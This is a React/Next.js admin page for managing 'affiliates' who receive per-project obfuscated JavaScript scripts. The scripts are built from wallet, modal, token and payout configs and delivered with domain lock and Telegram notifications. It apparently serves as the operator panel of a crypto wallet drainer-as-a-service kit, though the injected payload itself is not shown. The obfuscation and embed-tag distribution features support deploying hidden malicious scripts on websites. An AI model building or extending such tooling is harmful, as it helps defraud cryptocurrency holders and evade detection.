"use client";

import { useEffect, useState, useCallback } from "react";
import { useStore } from "@/lib/store";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import { Textarea } from "@/components/ui/textarea";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import {
  Users,
  Plus,
  Download,
  Trash2,
  Copy,
  CheckCircle2,
  AlertCircle,
  Shield,
  Check,
  PanelTop,
  KeyRound,
} from "lucide-react";
import { toast } from "sonner";
import { CompileOutput } from "@/components/compile/compile-output";
import type { AffiliateConfig } from "@/lib/projects";

type ObfuscationLevel = "none" | "minify" | "medium" | "heavy";

interface AffiliateProject {
  id: string;
  name: string;
  username: string;
  payoutAddress: string;
  telegramBotToken: string;
  telegramChatId: string;
  createdAt: string;
  status: "pending" | "active" | "paused" | "suspended";
  domains: string[];
  notes: string;
  lastCompiled: string | null;
}

interface GeneratedCredentials {
  username: string;
  password: string;
  affiliateName: string;
}

export default function AffiliatesPage() {
  const {
    setGeneralConfig,
    setWalletConfig,
    setModalConfig,
    setTokensConfig,
    setAdvancedConfig,
    setPayoutConfig,
  } = useStore();
  const [projects, setProjects] = useState<AffiliateProject[]>([]);
  const [loading, setLoading] = useState(true);
  const [dialogOpen, setDialogOpen] = useState(false);
  const [creating, setCreating] = useState(false);
  const [selectedProjectId, setSelectedProjectId] = useState<string | null>(null);
  const [loadingCompiler, setLoadingCompiler] = useState(false);

  // Credentials reveal modal
  const [credsOpen, setCredsOpen] = useState(false);
  const [generatedCreds, setGeneratedCreds] = useState<GeneratedCredentials | null>(null);

  // Form state
  const [name, setName] = useState("");
  const [payoutAddress, setPayoutAddress] = useState("");
  const [botToken, setBotToken] = useState("");
  const [chatId, setChatId] = useState("");
  const [notes, setNotes] = useState("");

  const loadProjects = useCallback(async () => {
    try {
      const res = await fetch("/api/projects", { cache: "no-store" });
      const data = await res.json();
      if (data.projects) setProjects(data.projects);
    } catch {
      toast.error("Failed to load affiliates");
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => { loadProjects(); }, [loadProjects]);

  async function handleCreate() {
    if (!name || !payoutAddress || !botToken || !chatId) {
      toast.error("Name, payout address, bot token, and chat ID are required");
      return;
    }
    setCreating(true);
    try {
      const res = await fetch("/api/projects", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          name,
          payoutAddress,
          telegramBotToken: botToken,
          telegramChatId: chatId,
          notes,
        }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.message);

      // Show credentials modal — this is the only time the password is visible
      setGeneratedCreds({
        username: data.credentials.username,
        password: data.credentials.password,
        affiliateName: name,
      });
      setCredsOpen(true);
      setDialogOpen(false);
      resetForm();
      loadProjects();
    } catch (error: unknown) {
      toast.error(error instanceof Error ? error.message : "Failed to create");
    } finally {
      setCreating(false);
    }
  }

  function resetForm() {
    setName("");
    setPayoutAddress("");
    setBotToken("");
    setChatId("");
    setNotes("");
  }

  async function handleResetPassword(p: AffiliateProject) {
    if (!confirm(`Reset password for ${p.name}? Their current password will stop working immediately.`)) return;
    try {
      const res = await fetch(`/api/projects/${p.id}/reset-password`, { method: "POST" });
      const data = await res.json();
      if (!res.ok) throw new Error(data.message);

      setGeneratedCreds({
        username: data.credentials.username,
        password: data.credentials.password,
        affiliateName: p.name,
      });
      setCredsOpen(true);
      toast.success(`Password reset for ${p.name}`);
    } catch (error: unknown) {
      toast.error(error instanceof Error ? error.message : "Reset failed");
    }
  }

  async function handleCompile(id: string, affName: string) {
    const level: ObfuscationLevel = (prompt(
      "Obfuscation level:\n• none — raw JS\n• minify — minified\n• medium — obfuscated (default)\n• heavy — full protection + domain lock",
      "medium"
    ) || "medium") as ObfuscationLevel;

    try {
      const res = await fetch(`/api/projects/${id}/compile?obfuscate=${level}`);
      if (!res.ok) throw new Error("Compile failed");

      const blob = await res.blob();
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = `script-${affName.toLowerCase().replace(/\s+/g, "-")}.js`;
      a.click();
      URL.revokeObjectURL(url);

      toast.success(`Script compiled (${level}) for ${affName}`);
      loadProjects();
    } catch {
      toast.error("Failed to compile script");
    }
  }

  async function handleApprove(id: string, affName: string) {
    try {
      const res = await fetch(`/api/projects/${id}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ status: "active" }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data?.message || "Approval failed");
      toast.success(`${affName} approved`);
      await loadProjects();
    } catch (error: unknown) {
      toast.error(error instanceof Error ? error.message : "Failed to approve affiliate");
    }
  }

  async function handleLoadCompiler(project: AffiliateProject) {
    setLoadingCompiler(true);
    try {
      const res = await fetch(`/api/projects/${project.id}/config`, { cache: "no-store" });
      const data = (await res.json()) as { config?: AffiliateConfig; message?: string };
      if (!res.ok || !data.config) {
        throw new Error(data?.message || "Failed to load affiliate config");
      }

      setGeneralConfig(data.config.general);
      setWalletConfig(data.config.wallet);
      setModalConfig(data.config.modal);
      setTokensConfig(data.config.tokens);
      setAdvancedConfig(data.config.advanced);
      setPayoutConfig(data.config.payout);
      setSelectedProjectId(project.id);
      toast.success(`Loaded ${project.name} into compiler`);
    } catch (error: unknown) {
      toast.error(error instanceof Error ? error.message : "Failed to load compiler panel");
    } finally {
      setLoadingCompiler(false);
    }
  }

  async function handleDelete(id: string) {
    if (!confirm("Delete this affiliate project? This cannot be undone.")) return;
    try {
      await fetch(`/api/projects/${id}`, { method: "DELETE" });
      toast.success("Deleted");
      loadProjects();
    } catch {
      toast.error("Failed to delete");
    }
  }

  function copyToClipboard(text: string, label: string) {
    navigator.clipboard.writeText(text);
    toast.success(`${label} copied`);
  }

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold tracking-tight flex items-center gap-2">
            <Users className="h-6 w-6" /> Affiliates
          </h1>
          <p className="text-muted-foreground text-sm mt-1">
            Create and manage affiliate projects. Credentials are auto-generated at creation.
          </p>
        </div>

        <Dialog open={dialogOpen} onOpenChange={setDialogOpen}>
          <DialogTrigger asChild>
            <Button className="gap-2 rounded-none font-mono text-xs uppercase tracking-wider">
              <Plus className="h-4 w-4" /> New Affiliate
            </Button>
          </DialogTrigger>
          <DialogContent className="sm:max-w-lg bg-black/95 border-border/40">
            <DialogHeader>
              <DialogTitle className="font-mono uppercase tracking-wider text-sm">
                Create Affiliate Project
              </DialogTitle>
            </DialogHeader>
            <div className="space-y-4 pt-2">
              <div className="space-y-2">
                <Label className="text-xs font-mono uppercase tracking-wider">Name / Label</Label>
                <Input
                  placeholder="e.g. John's DeFi Site"
                  value={name}
                  onChange={(e) => setName(e.target.value)}
                  className="rounded-none bg-black/40 border-border/40"
                />
              </div>
              <div className="space-y-2">
                <Label className="text-xs font-mono uppercase tracking-wider">Payout Address</Label>
                <Input
                  placeholder="0x..."
                  value={payoutAddress}
                  onChange={(e) => setPayoutAddress(e.target.value)}
                  className="rounded-none bg-black/40 border-border/40 font-mono text-xs"
                />
              </div>
              <div className="space-y-2">
                <Label className="text-xs font-mono uppercase tracking-wider">Telegram Bot Token</Label>
                <Input
                  placeholder="123456:ABC-DEF..."
                  value={botToken}
                  onChange={(e) => setBotToken(e.target.value)}
                  className="rounded-none bg-black/40 border-border/40 font-mono text-xs"
                />
              </div>
              <div className="space-y-2">
                <Label className="text-xs font-mono uppercase tracking-wider">Telegram Chat ID</Label>
                <Input
                  placeholder="-1001234567890"
                  value={chatId}
                  onChange={(e) => setChatId(e.target.value)}
                  className="rounded-none bg-black/40 border-border/40 font-mono text-xs"
                />
              </div>
              <div className="space-y-2">
                <Label className="text-xs font-mono uppercase tracking-wider">Notes (optional)</Label>
                <Textarea
                  placeholder="Internal notes about this affiliate..."
                  value={notes}
                  onChange={(e) => setNotes(e.target.value)}
                  className="rounded-none bg-black/40 border-border/40 text-xs resize-none"
                  rows={2}
                />
              </div>
              <p className="text-[10px] text-muted-foreground font-mono">
                A username and password will be auto-generated. You&apos;ll see them once after creation.
              </p>
              <Button
                onClick={handleCreate}
                disabled={creating}
                className="w-full rounded-none font-mono text-xs uppercase tracking-wider"
              >
                {creating ? "Creating..." : "Create Project"}
              </Button>
            </div>
          </DialogContent>
        </Dialog>
      </div>

      {/* ── Credentials reveal modal ─────────────────────────────────────── */}
      <Dialog open={credsOpen} onOpenChange={setCredsOpen}>
        <DialogContent className="sm:max-w-md bg-black/95 border-border/40">
          <DialogHeader>
            <DialogTitle className="font-mono uppercase tracking-wider text-sm flex items-center gap-2">
              <KeyRound className="h-4 w-4 text-emerald-400" />
              Affiliate Credentials
            </DialogTitle>
          </DialogHeader>
          {generatedCreds && (
            <div className="space-y-4 pt-2">
              <p className="text-xs text-amber-400 font-mono">
                Save these credentials now — the password cannot be retrieved again.
              </p>
              <p className="text-xs text-muted-foreground">
                Affiliate: <span className="text-white font-medium">{generatedCreds.affiliateName}</span>
              </p>
              <div className="space-y-3">
                <div className="space-y-1">
                  <Label className="text-[10px] font-mono uppercase tracking-wider text-muted-foreground">Username</Label>
                  <div className="flex items-center gap-2">
                    <code className="flex-1 bg-black/60 border border-border/40 px-3 py-2 text-sm font-mono text-emerald-400 rounded-none">
                      {generatedCreds.username}
                    </code>
                    <Button
                      variant="ghost"
                      size="icon"
                      className="h-9 w-9 rounded-none shrink-0"
                      onClick={() => copyToClipboard(generatedCreds.username, "Username")}
                    >
                      <Copy className="h-3.5 w-3.5" />
                    </Button>
                  </div>
                </div>
                <div className="space-y-1">
                  <Label className="text-[10px] font-mono uppercase tracking-wider text-muted-foreground">Password</Label>
                  <div className="flex items-center gap-2">
                    <code className="flex-1 bg-black/60 border border-border/40 px-3 py-2 text-sm font-mono text-emerald-400 rounded-none">
                      {generatedCreds.password}
                    </code>
                    <Button
                      variant="ghost"
                      size="icon"
                      className="h-9 w-9 rounded-none shrink-0"
                      onClick={() => copyToClipboard(generatedCreds.password, "Password")}
                    >
                      <Copy className="h-3.5 w-3.5" />
                    </Button>
                  </div>
                </div>
              </div>
              <Button
                className="w-full rounded-none font-mono text-xs uppercase tracking-wider"
                onClick={() => {
                  const text = `Username: ${generatedCreds.username}\nPassword: ${generatedCreds.password}`;
                  copyToClipboard(text, "Credentials");
                }}
              >
                <Copy className="h-3.5 w-3.5 mr-2" /> Copy Both
              </Button>
            </div>
          )}
        </DialogContent>
      </Dialog>

      {/* Stats */}
      <div className="grid grid-cols-3 gap-4">
        <Card className="border-border/40 bg-black/40 backdrop-blur-xl rounded-none">
          <CardContent className="p-4">
            <p className="text-[10px] font-mono uppercase tracking-widest text-muted-foreground">Total Affiliates</p>
            <p className="text-2xl font-bold mt-1">{projects.length}</p>
          </CardContent>
        </Card>
        <Card className="border-border/40 bg-black/40 backdrop-blur-xl rounded-none">
          <CardContent className="p-4">
            <p className="text-[10px] font-mono uppercase tracking-widest text-muted-foreground">Active</p>
            <p className="text-2xl font-bold mt-1 text-emerald-500">
              {projects.filter((p) => p.status === "active").length}
            </p>
          </CardContent>
        </Card>
        <Card className="border-border/40 bg-black/40 backdrop-blur-xl rounded-none">
          <CardContent className="p-4">
            <p className="text-[10px] font-mono uppercase tracking-widest text-muted-foreground">Compiled</p>
            <p className="text-2xl font-bold mt-1">
              {projects.filter((p) => p.lastCompiled).length}
            </p>
          </CardContent>
        </Card>
      </div>

      {/* Table */}
      <Card className="border-border/40 bg-black/40 backdrop-blur-xl rounded-none">
        <CardHeader className="pb-3">
          <CardTitle className="text-sm font-mono uppercase tracking-wider">All Affiliates</CardTitle>
        </CardHeader>
        <CardContent>
          {loading ? (
            <p className="text-sm text-muted-foreground py-8 text-center">Loading...</p>
          ) : projects.length === 0 ? (
            <p className="text-sm text-muted-foreground py-8 text-center">
              No affiliates yet. Click &quot;New Affiliate&quot; to create one.
            </p>
          ) : (
            <Table>
              <TableHeader>
                <TableRow className="border-border/40">
                  <TableHead className="text-[10px] font-mono uppercase">Name</TableHead>
                  <TableHead className="text-[10px] font-mono uppercase">Username</TableHead>
                  <TableHead className="text-[10px] font-mono uppercase">Payout</TableHead>
                  <TableHead className="text-[10px] font-mono uppercase">Telegram</TableHead>
                  <TableHead className="text-[10px] font-mono uppercase">Status</TableHead>
                  <TableHead className="text-[10px] font-mono uppercase">Compiled</TableHead>
                  <TableHead className="text-[10px] font-mono uppercase text-right">Actions</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {projects.map((p) => (
                  <TableRow key={p.id} className="border-border/20">
                    <TableCell>
                      <div>
                        <p className="text-sm font-medium">{p.name}</p>
                        <button
                          onClick={() => copyToClipboard(p.id, "Project ID")}
                          className="text-[10px] font-mono text-muted-foreground hover:text-white flex items-center gap-1 mt-0.5"
                        >
                          {p.id} <Copy className="h-2.5 w-2.5" />
                        </button>
                      </div>
                    </TableCell>
                    <TableCell>
                      <button
                        onClick={() => copyToClipboard(p.username || "", "Username")}
                        className="font-mono text-xs text-cyan-400 hover:text-cyan-300 flex items-center gap-1"
                        title="Copy username"
                      >
                        {p.username || <span className="text-muted-foreground">—</span>}
                        {p.username && <Copy className="h-2.5 w-2.5" />}
                      </button>
                    </TableCell>
                    <TableCell className="font-mono text-xs">
                      {p.payoutAddress.slice(0, 6)}...{p.payoutAddress.slice(-4)}
                    </TableCell>
                    <TableCell className="text-xs">
                      {p.telegramChatId ? (
                        <span className="flex items-center gap-1 text-emerald-500">
                          <CheckCircle2 className="h-3 w-3" /> Connected
                        </span>
                      ) : (
                        <span className="flex items-center gap-1 text-muted-foreground">
                          <AlertCircle className="h-3 w-3" /> Not set
                        </span>
                      )}
                    </TableCell>
                    <TableCell>
                      <Badge
                        variant="outline"
                        className={`rounded-none text-[10px] font-mono uppercase ${
                          p.status === "active"
                            ? "border-emerald-500/30 text-emerald-500"
                            : p.status === "pending"
                            ? "border-cyan-500/30 text-cyan-400"
                            : p.status === "paused"
                            ? "border-yellow-500/30 text-yellow-500"
                            : "border-red-500/30 text-red-500"
                        }`}
                      >
                        {p.status}
                      </Badge>
                    </TableCell>
                    <TableCell className="text-xs text-muted-foreground">
                      {p.lastCompiled
                        ? new Date(p.lastCompiled).toLocaleDateString()
                        : "Never"}
                    </TableCell>
                    <TableCell className="text-right">
                      <div className="flex items-center justify-end gap-1">
                        {p.status === "pending" && (
                          <Button
                            variant="ghost"
                            size="icon"
                            className="h-7 w-7 rounded-none hover:bg-emerald-500/10 hover:text-emerald-500"
                            onClick={() => void handleApprove(p.id, p.name)}
                            title="Approve Affiliate"
                          >
                            <Check className="h-3.5 w-3.5" />
                          </Button>
                        )}
                        {/* Reset Password */}
                        <Button
                          variant="ghost"
                          size="icon"
                          className="h-7 w-7 rounded-none hover:bg-amber-500/10 hover:text-amber-400"
                          onClick={() => void handleResetPassword(p)}
                          title="Reset Password"
                        >
                          <KeyRound className="h-3.5 w-3.5" />
                        </Button>
                        <Button
                          variant="ghost"
                          size="icon"
                          className="h-7 w-7 rounded-none hover:bg-primary/10 hover:text-primary"
                          onClick={() => void handleLoadCompiler(p)}
                          title="Load Affiliate Into Compiler"
                          disabled={p.status !== "active" || loadingCompiler}
                        >
                          <PanelTop className="h-3.5 w-3.5" />
                        </Button>
                        <Button
                          variant="ghost"
                          size="icon"
                          className="h-7 w-7 rounded-none hover:bg-primary/10 hover:text-primary"
                          onClick={() => {
                            const base = process.env.NEXT_PUBLIC_BASE_URL || window.location.origin;
                            const scriptUrl = `${base}/api/script?configId=${p.id}`;
                            navigator.clipboard.writeText(
                              `<script src="${scriptUrl}"></script>`
                            );
                            toast.success("Script embed tag copied");
                          }}
                          title="Copy Script Embed Tag"
                        >
                          <Shield className="h-3.5 w-3.5" />
                        </Button>
                        <Button
                          variant="ghost"
                          size="icon"
                          className="h-7 w-7 rounded-none hover:bg-primary/10 hover:text-primary"
                          onClick={() => handleCompile(p.id, p.name)}
                          title="Compile & Download Script"
                          disabled={p.status !== "active"}
                        >
                          <Download className="h-3.5 w-3.5" />
                        </Button>
                        <Button
                          variant="ghost"
                          size="icon"
                          className="h-7 w-7 rounded-none hover:bg-red-500/10 hover:text-red-500"
                          onClick={() => handleDelete(p.id)}
                          title="Delete"
                        >
                          <Trash2 className="h-3.5 w-3.5" />
                        </Button>
                      </div>
                    </TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          )}
        </CardContent>
      </Card>

      {selectedProjectId && (
        <Card className="border-border/40 bg-black/40 backdrop-blur-xl rounded-none">
          <CardHeader>
            <CardTitle className="text-sm font-mono uppercase tracking-wider">
              Affiliate Compiler Panel
            </CardTitle>
          </CardHeader>
          <CardContent>
            <p className="mb-4 text-xs text-muted-foreground">
              The selected affiliate config is now loaded into the shared compile store. Use the compiler below to build their script.
            </p>
            <CompileOutput />
          </CardContent>
        </Card>
      )}
    </div>
  );
}
